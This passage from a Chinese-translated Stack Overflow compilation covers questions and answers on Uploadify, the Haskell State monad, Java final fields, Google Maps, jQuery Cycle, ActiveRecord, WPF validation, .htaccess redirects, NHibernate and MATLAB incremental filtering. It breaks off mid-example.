'cancelImg' : 'image/cancel.png',

'folder'    : 'uploads',

'buttonImg' : 'image/uploadbtn.png',

'height'    : 120,

'width'     : 400,

'sizeLimit' : 299240000,

'auto'      : false,

'queueSizeLimit' : 3,

'scriptData': {'session_name': '<?php echo session_id(); ?>'},

'checkScript' : 'ajaxfiles/check.php',

'onSelect'    : function(event,ID,fileObj) {

  $('#dialog').dialog('open');

  var price=$('#templateprice').val();

  var txt="You are now uploading 1 image at a price of $ "+price+" pr. image ";

  $('#test_para').text(txt);

},

'onError'     : function (event,ID,fileObj,errorObj) {

  alert(errorObj.type + ' Error: ' + errorObj.info);

},

'onProgress'  : function(event,ID,fileObj,data) {

  var bytes = Math.round(data.bytesLoaded / 1024);

  $('#' + $(event.target).attr('id') + ID).find('.percentage').text(' - ' + bytes + 'KB Uploaded');

  return false;

},

'onAllComplete'  : function(){ alert("Thank you. File uploaded successfully."); }

});

});

// ]]> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T16:40:29.650

Uploadify 使用 http 或 https 将文件上传到 PHP 脚本。

如果您同时打开了 80 和 22 端口，那么问题肯定出在其他地方。

我建议您调查服务器上的文件权限

> 确保上传文件夹的权限正确。如果您不确定或不确定将它们设置为什么权限，请使用 755。

[http://www.uploadify.com/documentation/uploadify/making-uploadify-secure/](http://www.uploadify.com/documentation/uploadify/making-uploadify-secure/)

# haskell - 为什么 State 需要一个值？

> ID：11583489
> 
> 赞同：13
> 
> 时间：2012-07-20T16:34:32.000
> 
> 标签：haskell, monads

[刚刚从这个优秀的教程](http://brandon.si/code/the-state-monad-a-tutorial-for-the-confused/)中学习了 State monad 。然而，当我试图向一个非程序员解释它时，他们有一个问题难倒了我。

如果 State 的目的是模拟可变内存，那么 state monad 存储的函数为什么是这样的类型：

```
s -> (a, s) 
```

而不仅仅是：

```
s -> s 
```

换句话说，对于“中间”值的需求是什么？例如，在我们需要它的情况下，我们不能通过简单地将状态定义为 的元组来模拟它`(state, value)`吗？

我确定我混淆了一些东西，任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-07-20T16:57:36.623

为了与像 C 这样的命令式语言进行类比，`s -> s`对应于具有返回类型的函数，该函数`void`纯粹是为了副作用（例如改变内存）而调用的。它同构于`State s ()`。

实际上，可以编写仅通过全局变量进行通信的 C 函数。但是，就像在 C 中一样，从函数返回值通常很方便。这`a`就是为了。

当然，对于您的特定问题，它可能`s -> s`是一个更好的选择。虽然它不是 Monad，但它是 Monoid（当包裹在[Endo](http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-Monoid.html#v:Endo)中时）。`<>`因此，您可以使用and构造这样的函数`mempty`，它们对应于Monad 的`>>=`and `return`。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-20T16:44:53.580

扩展尼克的答案：

`s`是状态。如果您的所有函数都是`s -> s`（状态到状态），您的函数将无法返回任何值。您可以将状态定义为`(the actual state, value returned)`，但这会将状态与有状态函数正在计算的值混为一谈。而且您希望函数实际计算和返回值也是常见的情况......

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-20T17:51:06.327

`s' -> s'`相当于`(a, s) -> (a, s)`。很明显`State`，`a`除了`s`.

另一方面，`s -> (a, s)`只需要种子`s`就可以开始事情，根本不需要`a`值。

因此，类型`s -> (a, s)`告诉你，`State`它比 if 它更简单`(a, s) -> (a, s)`。Haskell 中的类型传达了很多信息。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-07-23T17:17:03.607

> 如果 的目的`State`是模拟可变内存，为什么 state monad 存储的函数是以下类型：
> 
> ```
> s -> (a, s) 
> ```
> 
> 而不仅仅是：
> 
> ```
> s -> s 
> ```

monad的目的`State`不是模拟可变内存，而是对*既*产生值*又*产生副作用的计算进行建模。简单地说，给定 type 的一些初始状态`s`，您的计算将产生一些 type 的值`a`，以及更新的状态。

也许您的计算不会产生值...然后，很简单：值类型`a`是 simple `()`。另一方面，也许您的计算没有副作用。同样，很简单：您可能会认为您的状态转换函数（ 的`s -> s`参数`modify`）只是`id`。但通常你同时处理这两个问题。

* * *

您实际上可以使用`get`and`put`作为相对简单的示例：

```
get :: State s s      -- s -> (s, s)
put :: s -> State ()  -- s -> (s -> ((), s)) 
```

*   `get`是一个计算，在给定当前状态（第一个`s`）的情况下，它将作为一个值（即计算的结果）和“新”（未修改）状态返回它。

*   `put`是一个计算，给定一个新状态（第一个`s`）和一个当前状态（第二个`s`），将简单地*忽略*当前状态。它将`()`作为计算值产生（因为，当然，它没有计算任何值！）并挂在提供的新状态上。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-20T17:15:35.943

大概你想在`do`符号中使用你的有状态计算？

您应该问自己，`Monad`对于由

```
newtype State s = { runState :: s -> s } 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-20T16:39:30.683

`a`是返回的值，`s`是最终状态。

[http://www.haskell.org/haskellwiki/State_Monad#Implementation](http://www.haskell.org/haskellwiki/State_Monad#Implementation)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-07-31T15:55:01.707

要解决的问题是你有一个输入和一系列函数，你想把这些函数按顺序应用到输入上。

如果函数是纯粹的状态改变函数，`s -> s`在 type 的输入上`s`，那么你*不需要* `State`使用它们。Haskell 非常擅长将这些函数链接在一起，例如使用标准组合运算符`.`，或类似的东西`foldr (.) id`，或`foldr id`。

但是，如果这些函数都改变了一个状态*并*报告了这样做的一些结果，以便您可以给它们 type `s -> (s,a)`，那么将它们粘合在一起有点麻烦。您必须解压缩结果元组并将新状态值传递给下一个函数，在其他地方使用报告的值，然后解压缩*该*结果，依此类推。将错误状态传递给输入函数很容易，因为您必须显式命名每个结果并输入才能进行解包。你最终会得到这样的结果：

```
let
  (res1, s1) = fun1 s0
  (res2, s2) = fun2 s1
  (res3, s3) = fun3 res1 res2 s1
  ...
  in resN 
```

在那里，我不小心通过了`s1`而不是`s2`，可能是因为我后来添加了第二行并且没有意识到第三行需要更改。在编写`s -> s`函数时，不可能出现这个问题，因为没有正确的名称：

```
let
  resN = fun1 . fun2 . fun3 . -- etc. 
```

所以我们发明`State`了做同样的把戏。`State`本质上只是一种将函数粘合`s -> (s,a)`在一起的方式，这样正确的状态总是传递给正确的函数。

因此，人们并不是说“我们想使用`State`，让我们使用`s -> (s,a)`”，而是“我们正在编写类似的函数`s -> (s,a)`，让我们发明`State`来让它变得简单”。有了 functions `s -> s`，这已经很容易了，我们不必发明任何东西。

作为如何`s -> (s,a)`自然产生的示例，考虑解析：解析器将获得一些输入，消耗一些输入并返回一个值。在 Haskell 中，这很自然地被建模为获取一个输入列表，并返回一对值和剩余的输入 - 即`[Input] -> ([Input], a)`或`State [Input]`。

# java - 声明最终变量，但稍后设置

> ID：11583502
> 
> 赞同：47
> 
> 时间：2012-07-20T16:35:17.473
> 
> 标签：java, android

我知道这是一个相当简单的话题，但我真的很想绕开它。

这就是我想要做的，但它不喜欢 final 修饰符。有没有其他方法可以达到我想要的效果？这基本上是我想确保 id 在活动的整个生命周期中都不会改变。

```
private final long mId;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    mId = getIntent().getLongExtra(ID_KEY, -1);
} 
```

我应该指出，这是 Android 代码。感谢所有的帮助。我不担心 getter 或 setter 或任何人更改我的代码。我问的原因是为了让下一个开发人员接管我的代码。我发现这篇文章也有助于阐明一些观点。[Android - Activity 构造函数与 onCreate](https://stackoverflow.com/questions/3302177/android-activity-constructor-vs-oncreate)

* * *

## 回答 #1

> 赞同：62
> 
> 时间：2012-07-20T16:39:37.123

您`final`只能在构造函数或初始化程序中设置变量。常规方法不能更改声明的变量的值`final`。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2012-07-20T16:37:47.070

你不能。但是如果它是私有的并且你没有设置器，你可以保证没有外部对象改变它。

* * *

或者，您可以将 long 值包装在另一个类中 - `LazyImmutableLong`。但这是一种更冗长的方法，您可能不需要它（注意：下面的类不是线程安全的）

```
class LazyImmutableLong {

    private Long value;

    public void setValue(long value) {
         if (this.value != null) {
             return; // the value has already been set
         }
         this.value = value;
    }
    public long getValue() {return value;}
} 
```

在你的活动中

```
private LazyImmutableLong id = new LazyImmutableLong();

public void onCreate(..) {
    id.setValue(..);
} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2016-07-10T09:56:47.310

以下`Worm`（Write-Once-Read-Many）类可以在这种情况下提供帮助。

我们可以创建一个嵌套`Wrapper`类，它存储您需要的最终变量。要初始化此变量，您只需调用`wrapper`对象的构造函数。当您调用该方法`getData()`时，您将获得最终变量的*引用*，以防它被初始化，否则，您将获得`null`.

方法`getData()`和`setData(T data)`必须是线程安全的。为了提供它，我们使用对象的`volatile`修饰符`wrapper`。读取 volatile 变量是同步的，写入 volatile 变量也是同步的。尽管为使这段代码线程安全做了一些努力，但我没有在这方面对其进行测试。根据线程安全级别，您可以考虑使 setter 和 getter 同步。

```
public class Worm<T> {
    private volatile Wrapper<T> wrapper;

    public Worm() {}
    public Worm(T data) throws IllegalAccessError
    {
        setData(data);
    }

    public T getData()
    {
        if (wrapper == null)
            return null;
        return wrapper.data;
    }

    public void setData(T data) throws IllegalAccessError
    {
        if (wrapper != null)
            throw new IllegalAccessError();
        else
            wrapper = this.new Wrapper<>(data);
    }

    @Override
    public boolean equals(Object obj) {
        if (this == obj) {
            return true;
        }
        if (obj == null) {
            return false;
        }
        if (getClass() != obj.getClass()) {
            return false;
        }
        final Worm<T> other = (Worm<T>) obj;
        return Objects.equals(this.getData(), other.getData());
    }

    @Override
    public int hashCode() {
        return Objects.hashCode(this.getData());
    }

    final private class Wrapper<T> {
        final private T data;

        Wrapper(T data) {
            this.data = data;
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-20T16:37:28.550

```
private final long mId; 
```

`final`根据 java 规范，不能在运行时修改引用。因此，一旦您将其声明为 final，mId 就不能在其整个生命周期中指向其他内容（除非您使用反射（或）将值包装在对象中并通过其他引用对其进行修改）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-20T16:40:30.373

您以后只能在构造函数中设置全局最终变量。例子：

```
public class ClassA {
   private final long mID;

   public ClassA(final long mID) {
      this.mID = mID;
   }
} 
```

在这种情况下，您必须在每个构造函数中初始化最终变量。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-20T16:41:53.280

您必须在创建构造函数后立即对其进行初始化，或者您可以在构造函数中将其初始化为最大值。不迟。。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-07-20T16:39:06.703

不，它不能完成

如果你可以在一个地方声明final，稍后再初始化，那么final是什么意思。

如果您想拥有一个常量 ID，为什么不使用 Shared Preferences ，将其存储在 SP 中并随时检索。

# javascript - Google Maps Javascript API v3 疑难解答

> ID：11583504
> 
> 赞同：0
> 
> 时间：2012-07-20T16:35:39.937
> 
> 标签：javascript, google-maps

所以我的代码似乎不起作用。它没有说无效的密钥或任何东西。它只是空白。你能看看我的代码找出问题所在吗？谢谢你。

```
 <!DOCTYPE HTML>
<html>
    <head>
    <meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
    <script type="text/javascript" src="http://maps.google.com/maps/api/js?key=MYKEYDOESNTDISPLAYERRORS&sensor=false"></script>

    <script src="js/jquery.min.js"></script>
    <script type="text/javascript">
        function initialize() {
            var latlng = new google.maps.LatLng(57.0442, 9.9116);
            var settings = {
                zoom: 15,
                center: latlng,
                mapTypeControl: true,
                mapTypeControlOptions: {style: google.maps.MapTypeControlStyle.DROPDOWN_MENU},
                navigationControl: true,
                navigationControlOptions: {style: google.maps.NavigationControlStyle.SMALL},
                mapTypeId: google.maps.MapTypeId.ROADMAP
        };
        var map = new google.maps.Map(document.getElementById("map_canvas"), settings);

    </script>
</head>
<body onload="initialize()">
    <div id="map_canvas" style="width: 800px; height: 600px; margin: auto;">
    </div>
</body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:04:54.263

设置变量没有右括号。设置变量也与实例化地图的全局调用不在同一范围内 - 即使是，地图变量实例化也会在调用 initialize() 之前发生。试试这个：

```
<script type="text/javascript">
    var map;
    function initialize() {
        var latlng = new google.maps.LatLng(57.0442, 9.9116);
        var settings = {
            zoom: 15,
            center: latlng,
            mapTypeControl: true,
            mapTypeControlOptions: {style: google.maps.MapTypeControlStyle.DROPDOWN_MENU},
            navigationControl: true,
            navigationControlOptions: {style: google.maps.NavigationControlStyle.SMALL},
            mapTypeId: google.maps.MapTypeId.ROADMAP
        };
        map = new google.maps.Map(document.getElementById("map_canvas"), settings);
    };

</script> 
```

# jquery - jquery循环：覆盖宽度？

> ID：11583510
> 
> 赞同：0
> 
> 时间：2012-07-20T16:35:50.643
> 
> 标签：jquery, cycle, jquery-cycle

我正在使用 jQuery Cycle，但它会自动设置 div 的宽度。

循环的 div 有 ID #slideshow，所以我目前不得不修改 CSS

```
#slideshow {
  width: 100% !important;
} 
```

有没有办法使用 jQuery Cycle 选项而不是必须使用 !important 来实现这一点。

任何提示将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-20T16:43:04.293

[将宽度选项设置为](http://jquery.malsup.com/cycle/options.html)

```
width: "100%"  // container width (if the 'fit' option is true, the slides will be set to this width as well) 
```

# mysql - 使用 ActiveRecord，我如何从只有一条关联记录的数据库中获取所有记录？

> ID：11583516
> 
> 赞同：0
> 
> 时间：2012-07-20T16:35:56.613
> 
> 标签：mysql, sql, ruby-on-rails-3, activerecord

使用 ActiveRecord，我如何从只有一条关联记录的数据库中获取所有记录？

例如：我有两张表，table_a在table_b中有很多相关记录。

我想做一个 ActiveRecord 查询，它只获取 table_a 查询对象，这些对象在 table_b* 中只有一个关联记录。

我该怎么做呢？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-20T17:38:50.553

好吧，我不知道在 Rails 中有什么好的简单的方法可以做到这一点，但是我收集了一个原始 sql 查询，您可以使用 ActiveRecord::Base.connection.execute 触发它。让我告诉你，这可能是我构建过的最丑陋的查询，对此我深表歉意 :-)

```
SELECT ta.* FROM table_a AS ta INNER JOIN table_b AS tb ON ta.id = tb.table_a_id WHERE
  tb.id IN ( SELECT temp.id FROM (
    SELECT id, count(*) AS count FROM table_b GROUP BY table_a_id
  ) AS temp WHERE temp.count=1 ) GROUP BY ta.id; 
```

# wpf - 滚动时 DataGridTemplateColumn.CellTemplate 中的 TextBlock 丢失验证样式

> ID：11583518
> 
> 赞同：0
> 
> 时间：2012-07-20T16:36:03.450
> 
> 标签：wpf, validation, templates, datagrid

我有一个使用 DataGridTemplateColumns 构建的数据网格。当存在验证错误时，我们会将其显示在 CellTemplate 的 Textblock 上。发生滚动时，错误样式会在滚动离开页面后丢失。

在我的控制资源中：

```
<ControlTemplate x:Key="validationTemplate">
        <Grid>
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width="auto"/>
                <ColumnDefinition Width="*"/>
            </Grid.ColumnDefinitions>
            <TextBlock Foreground="Yellow" 
                       FontSize="20" 
                       VerticalAlignment="Center"
                       Margin="0,0,2,2">!</TextBlock>
            <Border Grid.Column="1" 
                    BorderBrush="Yellow" 
                    BorderThickness="1" 
                    Margin="0" 
                    Padding="0"
                    Height="19">
                <AdornedElementPlaceholder/>
            </Border>
        </Grid>
    </ControlTemplate>

<Style x:Key="TextBlockValidationStyle" TargetType="{x:Type TextBlock}">
        <Style.Triggers>
            <Trigger Property="Validation.HasError" Value="true">
                <Setter Property="ToolTip"
                Value="{Binding RelativeSource={RelativeSource Self},
                Path=(Validation.Errors)[0].ErrorContent}"/>
            </Trigger>
        </Style.Triggers>
    </Style> 
```

在 DataGrid 中：

```
 <DataGridTemplateColumn Header="Destination Column">
                    <DataGridTemplateColumn.CellEditingTemplate>
                        <DataTemplate>
                            <ComboBox IsEditable="True"
                                      IsTextSearchCaseSensitive="{Binding ElementName=caseSensitiveSearch, Path=IsChecked}"
                                      ItemsSource="{Binding AllSuggestedNames}"
                                      TextSearch.TextPath="SuggestedName"
                                      Text="{Binding ColumnMapping.DestinationColumnName, UpdateSourceTrigger=PropertyChanged}"/>
                        </DataTemplate>
                    </DataGridTemplateColumn.CellEditingTemplate>
                    <DataGridTemplateColumn.CellTemplate>
                        <DataTemplate>
                            <TextBlock Style="{StaticResource TextBlockValidationStyle}"
                                       Text="{Binding ColumnMapping.DestinationColumnName, 
                                                ValidatesOnDataErrors=True, 
                                                NotifyOnValidationError=True, 
                                                UpdateSourceTrigger=PropertyChanged}"
                                       Validation.ErrorTemplate="{StaticResource validationTemplate}"/>
                        </DataTemplate>
                    </DataGridTemplateColumn.CellTemplate>
                </DataGridTemplateColumn> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-20T19:05:18.067

解决了！用 AdornerDecorator 包裹每个 CellTemplate 的 DataTemplate 内部，将其修复！

```
 <DataTemplate>
                        <AdornerDecorator>
                            <TextBlock Style="{StaticResource TextBlockValidationStyle}"
                                   Text="{Binding ColumnMapping.DestinationColumnName, 
                                            ValidatesOnDataErrors=True, 
                                            NotifyOnValidationError=True, 
                                            UpdateSourceTrigger=PropertyChanged}"
                                   Validation.ErrorTemplate="{StaticResource validationTemplate}"/>
                        </AdornerDecorator>
                    </DataTemplate> 
```

# .htaccess - htaccess 重定向没有目录

> ID：11583520
> 
> 赞同：0
> 
> 时间：2012-07-20T16:36:35.613
> 
> 标签：.htaccess

我想重定向（使用 .htaccess）到托管我的应用程序的外部站点，以便我可以为用户提供一个 url，`server.com/install`但是当我添加

`Redirect 301 / http://google.com/`它重定向到我的安装目录，`http://google.com/install`这不是我想要的。

我怎样才能用 htaccess 做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T18:51:39.490

`Redirect`自动将原始 URL 中的任何内容附加到新 URL。

试试这个：

```
Options FollowSymLinks
RewriteEngine On
RewriteRule ^/ http://google.com [L,R=301] 
```

* * *

再一次尝试，我添加了 RewriteBase 和通配符来匹配所有内容。`/`但我认为问题在于 .之后没有尾随`google.com`。如果这不起作用，也许其他人会回答。

```
Options FollowSymLinks
RewriteEngine On
RewriteBase /
RewriteRule ^(.*)$ http://google.com/ [L,R=301] 
```

# c# - 为什么 NHibernate 给我错误“无法解析属性：来自：客户”

> ID：11583522
> 
> 赞同：0
> 
> 时间：2012-07-20T16:36:49.157
> 
> 标签：c#, nhibernate

我有下表：

```
Customers:
  ID int PK
  FirstName varchar(50)
  LastName  varchar(50) 
```

我的映射文件：Customer.hbm.xml

```
<?xml version="1.0" encoding="utf-8" ?>

<hibernate-mapping xmlns="urn:nhibernate-mapping-2.2"
                          assembly="Viper.DataAccess"
                          namespace="DataAccess">
    <class name="Customer" entity-name="Customers" dynamic-update="true" >
        <id name="ID">
            <generator class="native" />
        </id>
        <property name="FirstName" />
        <property name="LastName" />
    </class>
</hibernate-mapping> 
```

代码片段：

```
using (ISession session = sessionFactory.OpenSession())
{
    var query = from customer in session.QueryOver<Customer>()
                select customer;

    var c = query.Take(1).SingleOrDefault<Customer>();
} 
```

我收到“无法解析属性：来自：客户”的错误

任何想法为什么这会给我这个错误？

编辑：

我将查询修改为：

```
var query = from customer in session.QueryOver<Customer>()
            where customer.ID >= 0
            select customer; 
```

它工作正常。

请告诉我，我不必为了让 NHibernate 工作而使用无意义的 where 子句！？？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-20T16:57:54.027

您在那里混合 QueryOver 和 Linq。这是完全错误的做法。所以你应该添加`using NHibernate.Linq;`到你的使用中

`session.Query<Customer>()`并使用而不是重写您的查询`session.QueryOver<Customer>()`

```
using (ISession session = sessionFactory.OpenSession())
{
    var query = from customer in session.Query<Customer>()
                select customer;

    var c = query.Take(1).SingleOrDefault<Customer>();
} 
```

# matlab - 在matlab中更改过滤器（B，A，X）和内存不足错误

> ID：11583523
> 
> 赞同：2
> 
> 时间：2012-07-20T16:36:51.360
> 
> 标签：matlab, image-processing, filter, signal-processing

这篇文章与我之前的问题有关：[matlab 中的图像处理，](https://stackoverflow.com/questions/10863734/image-processing-algorithm-in-matlab) 因为我在那里上传了我的算法。我的想法是我正在尝试更改代码的过滤部分。在 matlab filter.m 函数中可以接受过滤器（B，A，我的像素随时间演变），它会返回过滤后的值。但目前我必须一起通过整个时间序列。

但问题是，现在我想以某种方式更改代码，而不是将整个时间序列传递给过滤器，我想一次传递一个值，但我希望过滤器函数将值视为第 n 个值而不是第一个值。我创建了一个 sudo 代码，因为我在代码中注入了一张图片，但我不知道如何更改过滤部分。任何人有任何想法吗？

```
clear all
j=1;
for i=0:3000
  str = num2str(i);
  str1 = strcat(str,'.mat');
  load(str1);
  D{j}=A(20:200,130:230);
  j=j+1;
end
N=5;
w = [0.00000002 0.05;0.05 0.1;0.1 0.15;0.15 0.20;
     0.20 0.25;0.25 0.30;0.30 0.35;0.35 0.40;
     0.40 0.45;0.45 0.50;0.50 0.55;0.55 0.60;
     0.60 0.65;0.65 0.70;0.70 0.75;0.75 0.80;
     0.80 0.85;0.85 0.90;0.90 0.95;0.95 0.99999999];
for ind=1:20
  wn = w(ind,:);
  [b,a] = butter(N,wn);
  bCoeff(ind,:)=b;
  aCoeff(ind,:)=a;
end

ts=[];
sumLastImages=[];
for k=1:10 %number of images
  for bands=1:20 %number of bands
    for i=1:10 %image h
      for j=1:10 %image w
        pixelValue = D{k}(i,j);          
        % reflectivity elimination        
        % for the current pixel, have the summation of the same position from before 
        % images and create a mean value base on the temporal values
        sumLastImages(i,j)=pixelValue+sumLastImages(i,j);
        meanValue = sumLastImages(i,j)/k;

        if(meanValue==0)            
          filteredimages{bands}(i,j)=0; 
          continue;
        else
          pixel_calculated_meanvalue = pixelValue/meanValue; 
        end                      
        % filter part that need to be changed, and because we are adding 
        % one value then the reutrn of the filter is one too         
        ts_f = filter(bCoeff(bands,:), aCoeff(bands,:), ...
                      pixel_calculated_meanvalue);                         
        filteredimages{bands}(i,j)=ts_f;            
      end     
    end       

    finalImagesSummation{bands}(:,:) = ...
      (filteredimages{bands}(:,:)^2)+finalImagesSummation{bands}(:,:);
    finalImages{bands}(:,:)=finalImagesSummation/k;
  end
end 
```

**编辑** 我设法更改了这样的代码，现在我加载了第 200 张图像，之后我能够将图像一张一张地注入过滤器，但现在的问题是我收到`"Out of memory. Type HELP MEMORY for your options."`大图像的错误。这是我的代码任何有效代码的想法：

```
%%
cd('D:\MatlabTest\06-06-Lentils');
clear all

%%

N=5;
W = [0.0 0.10;0.10 0.20;0.20 0.30;0.30 0.40;
     0.40 0.50;0.50 0.60 ;0.60 0.70;0.70 0.80 ;
     0.80 0.90;0.90 1.0];

[bCoeff{1},aCoeff{1}] = butter(N,0.1,'Low');
for ind=2:9
  wn = W(ind,:);
  [b,a] = butter(N,wn);
  bCoeff{ind}=b;
  aCoeff{ind}=a;
end
[bCoeff{10},aCoeff{10}] = butter(N,0.9,'high');

%%
j=1;

D = zeros(200,380,320);

T = 200;
K = 0:399;
l = T+1;
Yout = cell(1,10);
figure;

for i = 1:length(K)-200
  disp(i)

  if i == 1
    for j = 1:T
      str = int2str(K(1)+j-1);
      str1 = strcat(str,'.mat');
      load(str1);
      D(j,1:380,1:320) = A;
    end

  else

    str = int2str(l);
    str1 = strcat(str,'.mat');
    load(str1);

    temp = D(2:200,1:380,1:320) ;
    temp(200,1:380,1:320) = A;
    D = temp;
    clear temp
    l = l +1;

  end

  for p = 1:380
    for q = 1:320
      x = D(:,p,q) - mean(D(:,p,q));

      for k = 1:10
        temp = filter(bCoeff{k},aCoeff{k},x);
        if i == 1
          Yout{k}(p,q) = mean(temp);
        else
          Yout{k}(p,q) = (Yout{k}(p,q)  + mean(temp))/2;
        end
      end
    end
  end

  for k = 1:10
    subplot(5,2,k)
    subimage(Yout{k}*1000,[0 255]);
    color bar
    colormap jet
  end
  pause(0.01);
end

disp('Done Loading...') 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-21T00:33:12.767

## 概述

如果您想要的只是一个 IIR 滤波器，您可以逐步提供它，即您不必一次提供完整的向量，您可以简单地实现自己的函数并使用任一`persistent`变量。

## 简单的方法

下面的代码片段定义了一个函数`myFilter`，它使用`persistent` 变量，您可以使用以下命令控制变量：

*   `init`: 设置 IIR 系数
*   `getA`: 返回 A 系数，即输出权重
*   `getB`：返回B系数，即输入权重
*   `getX`: 返回存储的输入数据 x[0], x[1], ... x[M]
*   `getY`: 返回输出数据 y[0], y[1], ... y[N]
*   `getCurrentY`: 返回最后一个输出数据 y[N]

这是功能：

```
function result = myFilter(varargin)
% myFilter   A simple IIR filter which can be fed incrementally.
%
% The filter is controlled with the following commands:
%   myFilter('init', B, A)
%      Initializes the coefficients B and A. B are the weights for the
%      input and A for the output.
%   myFilter('reset')
%      Resets the input and output buffers to zero.
%   A = myFilter('getA')
%   B = myFilter('getB')
%      Returns the filter coefficients A and B, respectively.
%   x = myFilter('getX')
%   y = myFilter('getY')
%      Returns the buffered input and output vectors.
%   y = myFilter('getCurrentY')
%      Returns the current output value.
%   myFilter(x)
%      Adds the new value x as input to the filter and updates the 
%      output.

    persistent Bcoeff
    persistent Acoeff
    persistent x
    persistent y

    if ischar(varargin{1})
        % This is a command.
        switch varargin{1}
            case 'init'
                Bcoeff = varargin{2};
                Acoeff = varargin{3};
                Bcoeff = Bcoeff / Acoeff(1);
                Acoeff = Acoeff / Acoeff(1);
                x = zeros(size(Bcoeff));
                y = zeros(1, length(Acoeff) - 1);
                return

            case 'reset'
                x = zeros(size(Bcoeff));
                y = zeros(1, length(Acoeff) - 1);
                return

            case 'getA'
                result = Acoeff;
                return

            case 'getB'
                result = Bcoeff;
                return

            case 'getX'
                result = x;
                return

            case 'getY'
                result = y;
                return

            case 'getCurrentY'
                result = y(1);
                return

            otherwise
                error('Unknown command');
        end
    end

    % A new value has to be filtered.
    xnew = varargin{1};
    x = [xnew, x(1:end-1)];
    ynew = sum(x .* Bcoeff) - sum(y .* Acoeff(2:end));
    y = [ynew, y(1:end-1)];
end 
```

还有一个使用示例：

```
% Define the filter coefficients. Bcoeff acts on the input, Acoeff on
% the output.
Bcoeff = [4, 5];
Acoeff = [1, 2, 3];
% Initialize the filter.
myFilter('init', Bcoeff, Acoeff);

% Add a value to be filtered.
myFilter(10)
myFilter('getCurrentY')

ans =
    40

% Add another one.
myFilter(20)
myFilter('getCurrentY')

ans =
    50

% And a third one.
myFilter(30)
myFilter('getCurrentY')

ans =
     0

% Compare with the Matlab filter function.
filter(Bcoeff, Acoeff, [10 20 30])

ans =
    40    50     0 
```

这种方法的缺点是只能同时拥有一个有源滤波器。这是有问题的，例如在您的问题中，您有不同的过滤器以交替方式更新。

## 先进的方法

为了同时操作多个过滤器，您需要一些方法来识别过滤器。我在这里介绍的解决方案适用于手柄。句柄是简单的整数。更准确地说，它实际上是一个持久数组的索引，它本身保存着滤波器状态，即滤波器系数以及输入和输出的缓冲区。

调用语法有点复杂，因为你必须传递一个句柄。但是，多个过滤器可能同时处于活动状态。

```
function result = myFilterH(varargin)
% myFilterH   A simple IIR filter which can be fed incrementally.
%             Operates on a filter handle.
%
% The filter is controlled with the following commands:
%   handle = myFilterH('create')
%      Creates a new filter handle.
%   myFilterH(handle, 'init', B, A)
%      Initializes the coefficients B and A. B are the weights for the
%      input and A for the output. handle identifies the filter.
%   myFilterH(handle, 'reset')
%      Resets the input and output buffers to zero.
%   A = myFilterH(handle, 'getA')
%   B = myFilterH(handle 'getB')
%      Returns the filter coefficients A and B, respectively.
%   x = myFilterH(handle, 'getX')
%   y = myFilterH(handle, 'getY')
%      Returns the buffered input and output vectors.
%   y = myFilterH(handle, 'getCurrentY')
%      Returns the current output value.
%   myFilterH(handle, x)
%      Adds the new value x as input to the filter and updates the 
%      output.

    persistent handles

    if ischar(varargin{1})
        if strcmp(varargin{1}, 'create')
            if isempty(handles)
                handles = struct('x', [], 'y', [], 'A', [], 'B', []);
                result = 1;
            else
                result = length(handles) + 1;
                handles(result).x = [];
            end
            return
        else
            error('First argument must be a filter handle or ''create''');
        end
    end

    % The first input should be the handles(hIdx).
    hIdx = varargin{1};
    if hIdx < 0 || hIdx > length(handles)
        error('Invalid filter handle')
    end

    if ischar(varargin{2})
        % This is a command.
        switch varargin{2}
            case 'init'
                handles(hIdx).B = varargin{3};
                handles(hIdx).A = varargin{4};
                handles(hIdx).B = handles(hIdx).B / handles(hIdx).A(1);
                handles(hIdx).A = handles(hIdx).A / handles(hIdx).A(1);
                handles(hIdx).x = zeros(size(handles(hIdx).B));
                handles(hIdx).y = zeros(1, length(handles(hIdx).A) - 1);
                return

            case 'reset'
                handles(hIdx).x = zeros(size(handles(hIdx).B));
                handles(hIdx).y = zeros(1, length(handles(hIdx).A) - 1);
                return

            case 'getA'
                result = handles(hIdx).A;
                return

            case 'getB'
                result = handles(hIdx).B;
                return

            case 'getX'
                result = handles(hIdx).x;
                return

            case 'getY'
                result = handles(hIdx).y;
                return

            case 'getCurrentY'
                result = handles(hIdx).y(1);
                return

            otherwise
                error('Unknown command');
        end
    end

    % A new value has to be filtered.
    xnew = varargin{2};
    handles(hIdx).x = [xnew, handles(hIdx).x(1:end-1)];
    ynew = sum(handles(hIdx).x .* handles(hIdx).B) ...
               - sum(handles(hIdx).y .* handles(hIdx).A(2:end));
    handles(hIdx).y = [ynew, handles(hIdx).y(1:end-1)];
end 
```

还有这个例子：

```
% Define the filter coefficients.
Bcoeff = [4, 5];
Acoeff = [1, 2, 3];
% Create new filter handles.
fh1 = myFilterH('create');
fh2 = myFilterH('create');
% Initialize the filter handle. Note that reversing Acoeff and Bcoeff creates
% two totally different filters.
myFilterH(fh1, 'init', Bcoeff, Acoeff);
